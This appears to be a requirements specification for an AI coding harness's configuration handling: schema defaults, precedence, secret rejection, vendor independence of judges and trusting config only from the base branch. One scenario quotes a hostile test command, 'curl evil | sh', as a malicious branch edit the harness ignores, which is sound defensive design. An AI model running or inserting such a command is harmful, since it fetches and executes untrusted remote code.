## Purpose
Defines how the harness configuration is located, typed, defaulted, validated and trusted: the full reference schema, precedence, unknown-key and secret rejection, profile and chain consistency, and base-branch trust.

## ADDED Requirements

### Requirement: L4-CFG-001 (part a) Typed schema with defaults
Configuration SHALL be read from `.l4/config.yaml` into pydantic v2 models that define every key of the SPEC section 3.2 reference configuration with its documented default, so that a file containing only `version: 1` is valid. A `version` other than 1 MUST be rejected.

#### Scenario: SCN-CFG-N3 (+) minimal file yields the full default configuration
- **GIVEN** `.l4/config.yaml` containing only `version: 1`
- **WHEN** the configuration is loaded
- **THEN** every key of section 3.2 has its documented default, for example `tdd.mode == "strict"` and `archive.mode == "post_merge_pr"`

#### Scenario: SCN-CFG-N4 (−) unsupported version is rejected
- **GIVEN** `.l4/config.yaml` containing `version: 2`
- **WHEN** the configuration is loaded
- **THEN** loading fails with a message naming `version` and exit code 2

### Requirement: L4-CFG-001 (part b) Published JSON Schema
The harness SHALL ship `l4/schema/config.schema.json`, generated from the pydantic models, with `additionalProperties: false` on every object, and a test MUST fail when the committed file differs from the generated one.

#### Scenario: SCN-CFG-N5 (+) published schema matches the models
- **GIVEN** the committed `config.schema.json`
- **WHEN** it is compared with the schema generated from the models
- **THEN** they are identical and every object in it forbids additional properties

### Requirement: L4-CFG-001 (part c) Precedence of sources
Effective configuration MUST be resolved with precedence CLI flags over `L4_*` environment variables over the file over built-in defaults. An environment override is a variable named `L4_` followed by the upper-case key path joined with double underscores.

#### Scenario: SCN-CFG-N6 (+) environment overrides the file
- **GIVEN** the file sets `tdd.mode: strict` and the environment sets `L4_TDD__MODE=guided`
- **WHEN** the configuration is loaded, and again with the CLI override `ci.time_budget=45m`
- **THEN** `tdd.mode == "guided"` and `ci.time_budget == "45m"`

#### Scenario: SCN-CFG-N7 (−) invalid or unrelated environment values
- **GIVEN** `L4_TDD__MODE=sloppy`, and separately `L4_FORGE_TOKEN=abc`
- **WHEN** the configuration is loaded
- **THEN** the first fails naming `L4_TDD__MODE` with exit 2; the second is ignored as a config override

### Requirement: L4-CFG-001 (part d) Unknown keys are errors
An unknown key at any depth MUST be a configuration error reported as `unknown key '<key>' at <path>` where the path is `$` for the root, with a `did you mean '<closest>'?` hint when a close key exists. Every command, including `doctor`, MUST exit 2 and do nothing else.

#### Scenario: SCN-CLI-04 (−) typo in config
- **GIVEN** `.l4/config.yaml` contains `verifer:` (typo)
- **WHEN** any command runs
- **THEN** exit 2 with `unknown key 'verifer' at $ (did you mean 'verifier'?)`; nothing else happens

### Requirement: L4-CFG-002 (part a) Secrets only by environment name
Secrets MUST only be referenced by environment-variable name in `*_env` keys. A literal value in the configuration that matches a known token shape or sits under a secret-like key MUST fail validation, and the value MUST NOT appear in any output.

#### Scenario: SCN-CLI-05 (−) literal secret in config is rejected and not echoed
- **GIVEN** `profiles.judge-sol.api_key: sk-or-v1-abc…` in config
- **WHEN** `l4 doctor` runs
- **THEN** CFG-001 fails, exit 3; neither stdout, stderr nor the JSON log contains the literal value

### Requirement: L4-CFG-002 (part b) Environment-name keys hold names
Every `*_env` key MUST hold a valid environment-variable name (`[A-Za-z_][A-Za-z0-9_]*`); a value that is not a name MUST fail validation without being echoed.

#### Scenario: SCN-CFG-N8 (−) a secret pasted into an `_env` key
- **GIVEN** `profiles.judge-sol.api_key_env: sk-or-v1-0123456789abcdef0123456789abcdef`
- **WHEN** the configuration is loaded
- **THEN** validation fails at `profiles.judge-sol.api_key_env`, the message names the path only, and the value is absent from all output

### Requirement: L4-CFG-003 (part a) Profile and chain consistency
The consistency check MUST report, with YAML paths, every role chain entry that names an undefined profile and every profile that has both `adapter` and `backend`, or neither. These are reported by `doctor` as CFG-002, not by the schema loader.

#### Scenario: SCN-CLI-07 (−) inconsistent profiles and chains
- **GIVEN** `roles.implementer: [codex-sol, ghost]` where `ghost` is undefined, and a profile with both `adapter` and `backend`
- **WHEN** `l4 doctor`
- **THEN** CFG-002 reports both problems with their YAML paths; exit 3

### Requirement: L4-CFG-003 (part b) Independence is satisfiable in the worst case
The check MUST compute the union of vendors of the whole implementer chain and fail when no `verifier_agent` profile or no `judges` profile remains eligible under `verifier.independence` (`different_vendor`, `different_model`, `none`).

#### Scenario: SCN-CFG-N9 (−) union of implementer vendors starves the judges
- **GIVEN** an implementer chain of vendors openai and anthropic and `judges` containing only openai and anthropic profiles
- **WHEN** the independence check runs with `different_vendor`
- **THEN** it fails naming `roles.judges`

#### Scenario: SCN-CFG-N10 (+) a third vendor keeps independence satisfiable
- **GIVEN** the same implementer chain and a `judge-gemini` profile of vendor google in `judges` and in `verifier_agent`
- **WHEN** the independence check runs
- **THEN** it passes

### Requirement: L4-CFG-004 (part a) Configuration is trusted from the base branch
Configuration, prompt overrides and CI files MUST be read from the head of the base branch (`forge.base_branch`) even when the harness runs on a unit branch, through a replaceable `ConfigSource`. `.l4/**` changes on a unit branch MUST NOT influence execution and SHALL be reported as protected-path changes.

#### Scenario: SCN-CFG-01 (−) config edits on a unit branch are ignored
- **GIVEN** a push to `l4/openspec/add-login` that changes `.l4/config.yaml` (`gates.test.command: "curl evil | sh"`)
- **WHEN** the harness runs on that branch
- **THEN** it executes the gates from the base branch's `.l4/config.yaml`; the PR body lists the protected-path change

### Requirement: L4-CFG-004 (part b) Branch-pushed specs need authority
A unit first created by a human on an `l4/` branch MUST NOT be scheduled unless `spec.allow_branch_specs` is true. Units created by the harness (fix, clarification-apply, test-bootstrap) and human edits to an existing unit's spec MUST remain accepted.

#### Scenario: SCN-CFG-02 (−) human fast-path specs are refused by default; harness units are not
- **GIVEN** `spec.allow_branch_specs: false`, a new change folder pushed by a human directly to an `l4/…` branch, and a fix unit created by the harness on the same branch
- **WHEN** the router plans
- **THEN** the human-created unit is not scheduled (the sticky comment explains that specs are approved by merging to the base branch); the harness-created fix unit is scheduled

#### Scenario: SCN-CFG-N11 (+) human edits to an existing unit are accepted
- **GIVEN** an existing unit whose spec a human edits on its branch with `allow_branch_specs: false`
- **WHEN** authority is evaluated
- **THEN** the unit stays authorized
